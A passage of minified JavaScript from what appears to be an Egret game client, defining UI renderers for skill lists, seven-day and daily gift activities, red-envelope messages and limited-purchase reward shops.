0:o.configID)<l.TotemCT.ins().TotemSkillIDMax&&(l.TotemCT.ins().totemSkillAuto=1==a?!0:!1)):(this.checkBox_auto.selected=!0,c.TipsCT.ins().showTips(gettext("需保留一个自动技能")))},e.prototype.ClearObj=function(){this.skin&&(this.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this),this.checkBox_auto.removeEventListener(eui.UIEvent.CHANGE,this.CHANGE,this),this.sc.removeEventListener(eui.UIEvent.CHANGE_START,this.onMoveClick,this),this.sc.removeEventListener(eui.UIEvent.CHANGE_END,this.onEndClick,this),delMsg(this),this.removeDisplay())},e.prototype.removeDisplay=function(){if(this.skin){if(this.skillList&&this.skillList.numElements>0)for(var t=0;t<this.skillList.numElements;t++){var e=this.skillList.getElementAt(t);e&&e.ClearObj()}this.skillList&&(this.skillList.dataProvider=null),this.removeChildren()}},e}(s.BaseItemRender);e.SkillItem=m,window.SkillItem=m,__reflect(m.prototype,"SkillItem",[]),window.SkillItem=m},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SkillItemItem=void 0;var n=i(5),o=i(3),s=i(65),a=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.rect.visible=this.itemIndex%2!=0,this.skillLv.text=""+(this.itemIndex+1);var t=this.data.cfg;this.skillDes.textFlow=n.TextFlowMaker.generateTextFlow1(s.SkillUtil.getDesc(t)||""),this.selectImg.visible=this.data.max<=this.data.lv?this.data.max==this.itemIndex+1:this.data.lv==t.id%1e3},e.prototype.ClearObj=function(){this.rect=null,this.skillLv.text="",this.skillDes.text="",this.selectImg.source=""},e}(o.BaseItemRender);e.SkillItemItem=a,window.SkillItemItem=a,__reflect(a.prototype,"SkillItemItem",[]),window.SkillItemItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HSDTabListItemRender=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e.touchChildren=!1,e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data){var t=this.data;this.dayImg.source=t.upIcon,this.redpoint.visible=this.data.showRed}},e.prototype.selectChange=function(){this.currentState=this.selected?"unlockS":"unlock",this.redpoint.visible=this.data?this.data.showRed:!1},e}(n.BaseItemRender);e.HSDTabListItemRender=o,window.HSDTabListItemRender=o,__reflect(o.prototype,"HSDTabListItemRender",[]),window.HSDTabListItemRender=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HappySevenDayDayItem=void 0;var n=i(3),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.data&&(this.eRp.visible=this.data.redP)},e}(n.BaseItemRender);e.HappySevenDayDayItem=o,window.HappySevenDayDayItem=o,__reflect(o.prototype,"HappySevenDayDayItem",[]),window.HappySevenDayDayItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HappySevenDayItemRender=void 0;var n=i(19),o=i(66),s=i(5),a=i(3),r=i(11),l=i(36),h=i(6),u=i(25),p=i(2),d=i(9),c=i(33),f=function(t){function e(){var e=t.call(this)||this;return e.activityType=c.ActivityType.Normal,e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=r.ItemBase,this._listCollect=new eui.ArrayCollection,this.list.dataProvider=this._listCollect,this.actBtn.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTouch,this)},e.prototype.dataChanged=function(){if(this.data&&this.data.conf){this.activityType=this.data.activityType,this._listCollect.source=this.data.conf.reward,this.pName.textFlow=s.TextFlowMaker.generateTextFlow1(this.data.conf.name);var t=this.data.conf.maxCount||this.data.conf.dayLimit;this.scedule.textFlow=s.TextFlowMaker.generateTextFlow1("|C:65280&T:"+Math.floor(this.data.times/(this.data.conf.rate||1))+"|/"+Math.floor(t/(this.data.conf.rate||1))),this.currentState=2==this.data.state?"done":"normal",this.redpoint.visible=void 0==this.data.conf.maxCount&&1==this.data.state,0==this.data.state&&this.data.conf.turn?(this.actBtn.enabled=!0,this.actBtn.label=gettext("前  往")):(this.actBtn.label=gettext("领  取"),this.actBtn.enabled=1==this.data.state),185==this.data.conf.type&&(this.actBtn.enabled=!0,this.actBtn.label=gettext("{0}元宝",this.data.conf.param)),this.data.conf.rid&&(this.actBtn.enabled=!0,this.actBtn.label=o.PayUtils.getPayUnitStr(u.Recharge.ins().getCashByRid(this.data.conf.rid)/100,urlParam.payUnit))}},e.prototype.onTouch=function(t){if(185==this.data.conf.type&&!n.GlobalFun.checkCost(this.data.conf.param||0,l.MoneyConst.yuanbao))return void p.TipsCT.ins().showTips(gettext("元宝不足"));var e=h.BagCT.ins().rockonNeedNum(this.data.conf.reward);if(e&&h.BagCT.ins().getAllSurplusCount(e)<0)return void p.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));if(this.data.conf.rid)return void u.Recharge.ins().sendPayOrder(this.data.conf.rid);if(0==this.data.state&&this.data.conf.turn){var i=d.Activity.ins().handleTurn(this.data.conf.turn);i&&win.close("FuliWin")}d.Activity.ins().sendReward(this.data.activityID,this.data.conf.index,2)},e.prototype.destruct=function(){this.actBtn.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onTouch,this)},e}(a.BaseItemRender);e.HappySevenDayItemRender=f,window.HappySevenDayItemRender=f,__reflect(f.prototype,"HappySevenDayItemRender",[]),window.HappySevenDayItemRender=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HappySevenDayScoreItem=void 0;var n=i(3),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data){var t=this.data[0],e=this.data[1];if(e)switch(this.ItemIcon.data=t.reward[0],this.eScore.text=t.score+"",this.Rp.visible=this.eGetImg.visible=!1,this.touchChildren=!0,e.getRewardState(t.index)){case 0:break;case 1:this.touchChildren=!1,this.Rp.visible=!0;break;case 2:this.eGetImg.visible=!0}}},e}(n.BaseItemRender);e.HappySevenDayScoreItem=o,window.HappySevenDayScoreItem=o,__reflect(o.prototype,"HappySevenDayScoreItem",[]),window.HappySevenDayScoreItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HappySevenDayTabListItemRender=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e.touchChildren=!1,e}return __extends(e,t),e.prototype.dataChanged=function(){this.tabName.text=this.data.res,this.redpoint.visible=this.data.showRed},e.prototype.selectChange=function(){this.currentState=this.selected?"select":"unselect",this.data&&(this.redpoint.visible=this.data.showRed)},e}(n.BaseItemRender);e.HappySevenDayTabListItemRender=o,window.HappySevenDayTabListItemRender=o,__reflect(o.prototype,"HappySevenDayTabListItemRender",[]),window.HappySevenDayTabListItemRender=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShowType=e.ActivityType1Data=void 0;var n=i(0),o=i(7),s=i(8),a=i(33),r=i(9),l=function(t){function e(e){var i=t.call(this,e)||this;return i.awardArr=[],i.rewardsSum=[],i.readReawards(e),i}return __extends(e,t),e.prototype.update=function(e){t.prototype.update.call(this,e);e.readShort();this.awardNum+=1,this.awardArr.push(e.readInt())},e.prototype.readReawards=function(t){this.awardArr=[],this.awardNum=t.readInt();for(var e=0;e<this.awardNum;e++)this.awardArr.push(t.readInt());this.curVal=t.readInt();for(var i=t.readShort(),n=1;i>=n;n++)this.rewardsSum[n]=t.readShort()},e.prototype.canReward=function(){return this.checkRedPoint()},e.prototype.isOpenActivity=function(){var t=Math.floor((s.DateUtils.formatMiniDateTime(this.startTime)-o.GameServerCC.serverTime)/1e3),e=Math.floor((s.DateUtils.formatMiniDateTime(this.endTime)-o.GameServerCC.serverTime)/1e3);return 0>t&&e>0},e.prototype.getConfig=function(){return n.GlobalConfig.ActivityType1Config},e.prototype.getRewardStateById=function(t){var e=this.getConfig()[this.id][t];if(this.curVal<e.val)return r.Activity.NotReached;var i=this.awardArr.indexOf(e.index)>=0;return i?r.Activity.Geted:r.Activity.CanGet
},e.prototype.checkRedPoint=function(){var t=this.getConfig()[this.id];for(var e in t){var i=t[e],n=this.getRewardStateById(i.index),o=this.rewardsSum[i.index],s=i.total?i.total-o:1;switch(n){case r.Activity.NotReached:break;case r.Activity.CanGet:if(s>0)return!0;break;case r.Activity.Geted:}}return!1},e.prototype.getHide=function(){if(this.isHide)return this.isHide;var t=this.getConfig()[this.id],e=Object.keys(t);return t?this.awardNum>=e.length?(this.isHide=!0,this.isHide):(this.isHide=!1,this.isHide):this.isHide},e.prototype.getLeftTime=function(){if(this.endTime){var t=Math.floor((s.DateUtils.formatMiniDateTime(this.endTime)-o.GameServerCC.serverTime)/1e3);return 0>t&&(t=0),t}return 0},e.prototype.getStr=function(t){if(!t)return"";var e=t.lv,i=t.star,o=t.stage,s=t.power,a=n.GlobalConfig.ActivityType1Config[this.id][1].unit;return a?a.replace("lv",e+"").replace("stage",o+"").replace("star",i+"").replace("power",s+""):""},e}(a.ActivityBaseData);e.ActivityType1Data=l,window.ActivityType1Data=l,__reflect(l.prototype,"ActivityType1Data",[]);var h;!function(t){t[t.LEVEL=0]="LEVEL",t[t.RING=7]="RING",t[t.ZHANLING=9]="ZHANLING",t[t.QINGLONG=17]="QINGLONG",t[t.BAIHU=18]="BAIHU",t[t.ZHUQUE=19]="ZHUQUE",t[t.XUANWU=20]="XUANWU",t[t.PET=21]="PET"}(h=e.ShowType||(e.ShowType={})),window.ShowType=h,window.ActivityType1Data=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DailyGiftTask53Item=void 0;var n=i(3),o=i(9),s=i(11),a=i(6),r=i(2),l=i(4),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="DailyGiftTaskSkin",e.state=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=s.ItemBase,this.addTouchEvent(this.buy,this.onBuy)},e.prototype.dataChanged=function(){if(this.data){var t=this.data,e=o.Activity.ins().getActivityDataById(t.id);this.eList.dataProvider=new eui.ArrayCollection(t.content),this.dayName.text=gettext("第{0}天礼包",t.day),this.cost.text=t.price+"",t.day<e.day&&(this.buy.label=gettext("已购买")),t.day==e.day&&e.dayBuy&&(this.buy.label=gettext("已购买")),t.day!=e.day||e.dayBuy?this.redPoint.visible=!1:this.redPoint.visible=!0}},e.prototype.updateList=function(t){},e.prototype.onBuy=function(t){switch(t.target){case this.buy:var e=this.data,i=o.Activity.ins().getActivityDataById(e.id);if(e.day==i.day&&!i.dayBuy){if(l.ActorCC.yb<e.price)return void r.TipsCT.ins().showTips(gettext("元宝不足"));if(a.BagCT.ins().getAllSurplusCount(1)<0)return void r.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));o.Activity.ins().sendReward(e.id,e.idx,e.day)}}},e}(n.BaseItemRender);e.DailyGiftTask53Item=h,window.DailyGiftTask53Item=h,__reflect(h.prototype,"DailyGiftTask53Item",[]),window.DailyGiftTask53Item=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HongBaoSpeak=void 0;var n=i(1),o=i(0),s=i(2),a=i(9),r=i(171),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="hongbaoSpeakSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.initUI=function(){t.prototype.initUI.call(this)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.closeBtn,this.onClick),this.addTouchEvent(this.sendBtn,this.onClick),this.actId=t[0],this.index=t[1];var i=o.GlobalConfig.ActivityType12Config[this.actId][this.index];this.input.text="",this.input.promptColor=14668213,this.input.prompt=i.blessWord+gettext("（点击输入）"),this.input.maxChars=i.wordCount},e.prototype.close=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e]},e.prototype.onClick=function(t){switch(t.currentTarget){case this.closeBtn:win.close(this);break;case this.sendBtn:win.close(this);var e=a.Activity.ins().getActivityDataById(this.actId);if(!e.isOpenActivity())return void s.TipsCT.ins().showTips(gettext("活动已结束"));a.Activity.ins().sendReward(this.actId,this.index,r.EnvelopeType.SEND,this.input.text)}},e}(n.BaseView);e.HongBaoSpeak=l,window.HongBaoSpeak=l,__reflect(l.prototype,"HongBaoSpeak",[]),window.HongBaoSpeak=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Osa11p3item=void 0;var n=i(1),o=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._red=!1,e._sn_="osa11p3itemskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.touchEnabled=!0,this.touchChildren=!1},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.update()},e.prototype.update=function(){if(this.skin&&this._day&&this._cfg){for(var t in this._cfg)if(this._cfg[t].group==this._day){this.eImg.source=this._cfg[t].dayImg;break}this.showRed(this._red)}},Object.defineProperty(e.prototype,"day",{get:function(){return this._day},set:function(t){this._day=t,this.update()},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"cfg",{get:function(){return this._cfg},set:function(t){this._cfg=t,this.update()},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"select",{set:function(t){this.currentState=t?"done":"normal"},enumerable:!1,configurable:!0}),e.prototype.showRed=function(t){this._red=t,this.skin&&(this.redpoint.visible=this._red)},e}(n.BaseView);e.Osa11p3item=o,window.Osa11p3item=o,__reflect(o.prototype,"Osa11p3item",[]),window.Osa11p3item=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Osa11p3projectitem=void 0;var n=i(18),o=i(5),s=i(3),a=i(11),r=i(9),l=function(t){function e(){var e=t.call(this)||this;return e.skinName="osa11p3projectitemskin",e.listDP=new eui.ArrayCollection,e.list.itemRenderer=a.ItemBase,e.list.dataProvider=e.listDP,e}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data){var t=this.data;this.listDP.source=t.reward,this.actBtn.eRp.visible=this.eGetImg.visible=!1;var e=r.Activity.ins().getActivityDataById(t.id);if(e){var i=e.getTaskState(t.index);switch(i){case 1:this.actBtn.eRp.visible=this.actBtn.visible=this.actBtn.enabled=!0,this.actBtn.label=gettext("领取");break;case 2:this.eGetImg.visible=!0,this.actBtn.visible=!1;break;default:this.actBtn.visible=!0,this.actBtn.enabled=!1,this.actBtn.label=gettext("未完成")}this.pName.textFlow=o.TextFlowMaker.generateTextFlow(t.name+"\n"+("（|C:"+(0==i?n.ColorUtil.RED:n.ColorUtil.GREEN)+"&T:"+e.achieveInfo[t.index-1].times+"/"+t.target+"|）"))}}},e}(s.BaseItemRender);e.Osa11p3projectitem=l,window.Osa11p3projectitem=l,__reflect(l.prototype,"Osa11p3projectitem",[]),window.Osa11p3projectitem=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.XiaoNianListRenderer=void 0;var n=i(5),o=i(3),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="HuntListRendererSkin",e}return __extends(e,t),e.prototype.dataChanged=function(){this.data&&(this.showText.textFlow=n.TextFlowMaker.generateTextFlow(this.data))},e}(o.BaseItemRender);e.XiaoNianListRenderer=s,window.XiaoNianListRenderer=s,__reflect(s.prototype,"XiaoNianListRenderer",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget18Renderer=void 0;var n=i(5),o=i(3),s=i(0),a=i(10),r=function(t){function e(){var e=t.call(this)||this;return e.job=["",gettext("战士"),gettext("法师"),gettext("道士"),gettext("刺客"),gettext("弓手")],e.skinName="HuntListRendererSkin",e}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data,e=s.GlobalConfig.ItemConfig[t[1]];if(null!=e){var i,o=a.ItemUtil.getQualityColor(s.GlobalConfig.ItemDescConfig[e.descIndex].quality||0),r=a.ItemUtil.getType(e);i=0==r?"<font color = '#12b2ff'>"+t[0]+gettext("</font> 获得 <font color='")+o+"'>"+this.makeNameList(e)+"</font>":"<font color = '#12b2ff'>"+t[0]+gettext("</font> 获得 <font color='")+o+"'>"+e.name+"</font>",this.showText.textFlow=n.TextFlowMaker.generateTextFlow(i)}},e.prototype.makeNameList=function(t){var e="";return e=t.name},e.QUALITY_COLOR=["#e2dfd4","#35e62d","#d242fb","#ff750f","#f3311e","#ffd93f"],e}(o.BaseItemRender);e.OSATarget18Renderer=r,window.OSATarget18Renderer=r,__reflect(r.prototype,"OSATarget18Renderer",[]),window.OSATarget18Renderer=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget18Panel2Tips=void 0;var n=i(1),o=i(0),s=i(554),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="wishRewardSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){t.prototype.childrenCreated.call(this),this.list.itemRenderer=s.OSATarget18Panel2ListItem},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.activityID=t[0],this.updateData()},e.prototype.updateData=function(){var t=o.GlobalConfig.ActivityType13Config[this.activityID],e=[];for(var i in t)e.push({gift:t[i].award[0].id,reward:t[i].showReward});this.list.dataProvider=new eui.ArrayCollection(e)},e}(n.BaseView);e.OSATarget18Panel2Tips=a,window.OSATarget18Panel2Tips=a,__reflect(a.prototype,"OSATarget18Panel2Tips",[]),window.OSATarget18Panel2Tips=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget18Panel2ListItem=void 0;var n=i(3),o=i(11),s=i(0),a=function(t){function e(){var e=t.call(this)||this;return e.skinName="wishRewardItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){t.prototype.childrenCreated.call(this),this.list.itemRenderer=o.ItemBase},e.prototype.dataChanged=function(){t.prototype.dataChanged.call(this),this.data&&(this.gift.setData(s.GlobalConfig.ItemConfig[this.data.gift]),this.list.dataProvider=new eui.ArrayCollection(this.data.reward))},e}(n.BaseItemRender);e.OSATarget18Panel2ListItem=a,window.OSATarget18Panel2ListItem=a,__reflect(a.prototype,"OSATarget18Panel2ListItem",[]),window.OSATarget18Panel2ListItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget1Item=void 0;var n=i(3),o=i(546),s=i(9),a=i(5),r=i(0),l=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data){var t=this.data,e=s.Activity.ins().getActivityDataById(t.Id);this.eTitle.source="act1_t"+t.show,this.eList.dataProvider=new eui.ArrayCollection(t.rewards),this.ActivityShowType(t,e);var i=e.getRewardStateById(t.index),n=e.rewardsSum[t.index],o=t.total?t.total-n:1;switch(o=o>0?o:0,this.eHas.visible=this.eMy.visible=this.eBtn.visible=!1,i){case s.Activity.NotReached:this.eMy.visible=!0,0>=o&&(this.eMy.textFlow=a.TextFlowMaker.generateTextFlow(gettext("|C:${ColorUtil.RED}&T:已抢光|")));break;case s.Activity.CanGet:o>0?this.eBtn.visible=!0:(this.eMy.visible=!0,this.eMy.textFlow=a.TextFlowMaker.generateTextFlow(gettext("|C:${ColorUtil.RED}&T:已抢光|")));break;case s.Activity.Geted:this.eHas.visible=!0}}},e.prototype.ActivityShowType=function(t,e){var i,n;switch(t.show){case o.ShowType.LEVEL:var s="";return t.val>=1e3?(this.sTips=gettext("{0}转",Math.floor(t.val/1e3)),s=gettext("{0}转",Math.floor(e.curVal/1e3))):(this.sTips=gettext("{0}级",t.val),s=gettext("{0}级",Math.floor(e.curVal%1e3))),void(this.eMy.textFlow=a.TextFlowMaker.generateTextFlow(gettext("|C:0xffd480&T:我的{0}|\n|C:0xff1d1d&T:{1}|",r.GlobalConfig.ActivityType1Config[t.Id][1].tarName,s)));case o.ShowType.QINGLONG:case o.ShowType.BAIHU:case o.ShowType.ZHUQUE:default:i={lv:t.val,star:t.val,stage:t.val,power:t.val},n={lv:e.curVal,star:e.curVal,stage:e.curVal,power:e.curVal}}this.sTips=e.getStr(i),this.eMy.textFlow=a.TextFlowMaker.generateTextFlow(gettext("|C:0xffd480&T:我的{0}|\n|C:0xff1d1d&T:{1}|",r.GlobalConfig.ActivityType1Config[t.Id][1].tarName,e.getStr(n)))},e.prototype.onClick=function(){var t=this.data;s.Activity.ins().sendReward(t.Id,t.index)},e}(n.BaseItemRender);e.OSATarget1Item=l,window.OSATarget1Item=l,__reflect(l.prototype,"OSATarget1Item",[]),window.OSATarget1Item=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget2Panel1Item=void 0;var n=i(3),o=i(30),s=i(4),a=i(2),r=i(9),l=i(49),h=i(11),u=i(6),p=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.childrenCreated=function(){this.itemList.itemRenderer=h.ItemBase,this.itemList.dataProvider=new eui.ArrayCollection([])},e.prototype.dataChanged=function(){if(this.data){var t=this.data,e=r.Activity.ins().getActivityDataById(t.Id);this.itemList.dataProvider=new eui.ArrayCollection(t.rewards||[]),this.eOldPrice.text=t.originalPrice+"",this.eBtn.label=t.price+"",this.eBtn.eIcon.source=o.RewardData.getCurrencyRes(t.currencyType),t.count>0&&e.buyData[t.index]>=t.count?(this.eBtn.enabled=!1,this.eBtn.filters=l.FilterUtil.ARRAY_GRAY_FILTER):(this.eBtn.enabled=!0,this.eBtn.filters=null);var i=t.discount>0;this.eDisGrp.visible=i,this.eDiscount.visible=i;var n=getLangType();n==LanguageEnum.CN||n==LanguageEnum.CN1?this.eDiscount.text=i?t.discount+"折":"":this.eDiscount.text=i?100-10*t.discount+"折":"",this.eVipGrp.visible=t.vip>0,this.eVip.text="v"+(null===t||void 0===t?void 0:t.vip),this.canBuy.text=(e.buyData[t.index]||0)+"/"+(t.count||0)}},e.prototype.onClick=function(){if(u.BagCT.ins().getAllSurplusCount(2)<0)return void a.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));var t=this.data;if(t){var e=r.Activity.ins().getActivityDataById(t.Id);if(e)return t.count>0&&e.buyData[t.index]>=t.count?void a.TipsCT.ins().showTips(gettext("购买次数不足")):s.ActorCC.getCurrencyByType(t.currencyType)<t.price?void a.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:{0}不足|",o.RewardData.getCurrencyName(t.currencyType))):void r.Activity.ins().sendReward(t.Id,t.index)}},e}(n.BaseItemRender);e.OSATarget2Panel1Item=p,window.OSATarget2Panel1Item=p,__reflect(p.prototype,"OSATarget2Panel1Item",[]),window.OSATarget2Panel1Item=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget2Penel2Item=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="osa2p2itemskin",e}return __extends(e,t),e.prototype.dataChanged=function(){this.data&&(this.eIcon.source=this.data[0],this.eName.source=this.data[1])},e}(n.BaseItemRender);e.OSATarget2Penel2Item=o,window.OSATarget2Penel2Item=o,__reflect(o.prototype,"OSATarget2Penel2Item",[]),window.OSATarget2Penel2Item=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget2Panel6Item=void 0;var n=i(3),o=i(0),s=i(30),a=i(4),r=i(2),l=i(9),h=i(27),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa2p6itemskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick)},e.prototype.dataChanged=function(){if(this.data){this.cfg=this.data[0];var t=this.data[1],e=this.cfg.rewards[0];this.eIcon.data=e,this.eName.text=o.GlobalConfig.ZhuangBanId[t].name,this.ePrice.text=this.cfg.price+s.RewardData.getCurrencyName(this.cfg.currencyType);var i="";this.cfg.vip&&(i="VIP"+this.cfg.vip),this.cfg.count&&(i+=gettext("限购{0}次",this.cfg.count)),this.eLimit.text=i;var n=l.Activity.ins().activityData[this.cfg.Id],a=(n.buyData[this.cfg.index]||0)<this.cfg.count;this.eBtn.enabled=a,this.eBtn.label=a?gettext("购买"):gettext("已购买")}},e.prototype.onClick=function(t){var e=this;switch(t.target){case this.eBtn:if(!this.cfg)return;if(a.ActorCC.getCurrencyByType(this.cfg.currencyType)<this.cfg.price)return void r.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:{0}不足|",s.RewardData.getCurrencyName(this.cfg.currencyType)));h.WarnWin.show(gettext("是否消耗{0}购买{1}*{2}",this.cfg.price+s.RewardData.getCurrencyName(this.cfg.currencyType),o.GlobalConfig.ItemConfig[this.cfg.rewards[0].id].name,this.cfg.rewards[0].count),function(){l.Activity.ins().sendReward(e.cfg.Id,e.cfg.index)},this)}},e}(n.BaseItemRender);e.OSATarget2Panel6Item=u,window.OSATarget2Panel6Item=u,__reflect(u.prototype,"OSATarget2Panel6Item",[]),window.OSATarget2Panel6Item=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget2Panel7Item=void 0;var n=i(3),o=i(0),s=i(30),a=i(4),r=i(2),l=i(9),h=i(202),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa2p7itemskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick)},e.prototype.dataChanged=function(){if(this.data){var t=this.data,e=t.rewards[0];this.eIcon.data=e,this.eName.text=o.GlobalConfig.ItemConfig[e.id].name,this.ePrice.text=t.price+s.RewardData.getCurrencyName(t.currencyType);var i="";t.vip&&(i="VIP"+t.vip),t.count&&(i+=gettext("限购{0}次",t.count)),this.eLimit.text=i,this.eBtn.label=gettext("立即购买"),this.eBtn.sRp=a.ActorCC.level>=h.ActivityType2Data.LimitLevel,this.eBtn.enabled=!0;var n=l.Activity.ins().getActivityDataById(t.Id);n&&t.count>0&&n.buyData[t.index]>=t.count&&(this.eBtn.label=gettext("已购买"),this.eBtn.sRp=this.eBtn.enabled=!1)}},e.prototype.onClick=function(t){switch(t.target){case this.eBtn:var e=this.data;if(!e)return;if(a.ActorCC.getCurrencyByType(e.currencyType)<e.price)return void r.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:{0}不足|",s.RewardData.getCurrencyName(e.currencyType)));l.Activity.ins().sendReward(e.Id,e.index)}},e}(n.BaseItemRender);e.OSATarget2Panel7Item=u,window.OSATarget2Panel7Item=u,__reflect(u.prototype,"OSATarget2Panel7Item",[]),window.OSATarget2Panel7Item=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget3Panel14Item=void 0;var n=i(3),o=i(9),s=i(11),a=i(0),r=i(6),l=i(2),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa3p14itemskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick),this.eList.itemRenderer=s.ItemBase,this.eList.dataProvider=new eui.ArrayCollection},e.prototype.dataChanged=function(){if(this.data){var t=this.data;this.title.text=a.GlobalConfig.ActivityBtnConfig[t.Id].icon||"",this.eList.dataProvider=new eui.ArrayCollection(t.rewards);var e=o.Activity.ins().getActivityDataById(t.Id);if(e){if(1==t.type){var i=(e.dabiao[t.index-1]||0)>t.day?t.day:e.dabiao[t.index-1]||0;this.eDay.text=gettext("{0}/{1}天",i,t.day)}else if(2==t.type){var i=(e.chongzhiTotal||0)>t.val?t.val:e.chongzhiTotal||0;this.eDay.text=gettext("{0}/{1}元宝",i,t.val)}var n=(e.recrod>>t.index&1)==o.Activity.CanGet;this.eGet.visible=n,this.eBtn.visible=!this.eGet.visible;var s=2==t.type?e.chongzhiTotal>=t.val:e.dabiao[t.index-1]>=t.index;this.eBtn.enabled=s,this.eBtn.label=s?gettext("领取"):gettext("未完成"),this.redpoint.visible=s&&!n}}},e.prototype.onClick=function(t){switch(t.target){case this.eBtn:var e=this.data,i=r.BagCT.ins().rockonNeedNum(e.rewards);if(i&&r.BagCT.ins().getAllSurplusCount(i)<0)return void l.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));o.Activity.ins().sendReward(e.Id,e.index)}},e}(n.BaseItemRender);e.OSATarget3Panel14Item=h,window.OSATarget3Panel14Item=h,__reflect(h.prototype,"OSATarget3Panel14Item",[]),window.OSATarget3Panel14Item=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget3Panel15Item=void 0;var n=i(3),o=i(9),s=i(11),a=i(5),r=i(19),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa3p15itemskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick),this.eList.itemRenderer=s.ItemBase},e.prototype.dataChanged=function(){if(this.data){var t=this.data;this.eList.dataProvider=new eui.ArrayCollection(t.rewards),this.eCost.text=gettext("{0}元宝",t.val);var e=o.Activity.ins().getActivityDataById(t.Id);if(e){var i=e.getRewardStateById(t.index),n=i==o.Activity.NotReached?16711680:3532333,s=i==o.Activity.Geted?"":"（|C:"+n+"&T:"+e.chongzhiNum+"|/|C:0x35E62D&T:"+t.val+"|）";this.eNum.textFlow=a.TextFlowMaker.generateTextFlow1(s),this.eGet.visible=i==o.Activity.Geted,this.eBtn.visible=i!=o.Activity.Geted,this.eBtn.label=i==o.Activity.NotReached?gettext("前往充值"):gettext("可领取"),this.eBtn.sRp=i==o.Activity.CanGet}}},e.prototype.onClick=function(t){switch(t.target){case this.eBtn:if(this.eBtn.sRp){var e=this.data;o.Activity.ins().sendReward(e.Id,e.index)}else 